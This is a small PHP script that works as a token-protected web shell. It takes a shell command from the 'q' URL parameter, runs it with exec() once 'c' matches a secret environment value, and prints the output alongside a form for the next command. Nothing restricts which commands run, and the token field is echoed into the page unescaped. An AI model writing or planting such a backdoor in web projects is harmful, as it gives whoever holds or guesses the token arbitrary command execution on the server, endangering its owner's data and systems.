<?PHP
require_once "misc.php";
ReloadEnvFile();
$c = $_GET["c"] ?? "";
if ($c !== $_ENV["NV"]) die();

$q = $_GET["q"] ?? "";

if (!empty($q)) {
     echo "<pre>";
     echo exec($q, $out);
     foreach ($out as $line) echo "$line\n";
     echo "</pre>";
}
?>

<form>
     <input name="c" type="hidden" value="<?= $c ?>">
     <input name="q" value="<?= htmlspecialchars($q) ?>" >
     <input type="submit" value="Query">
</form>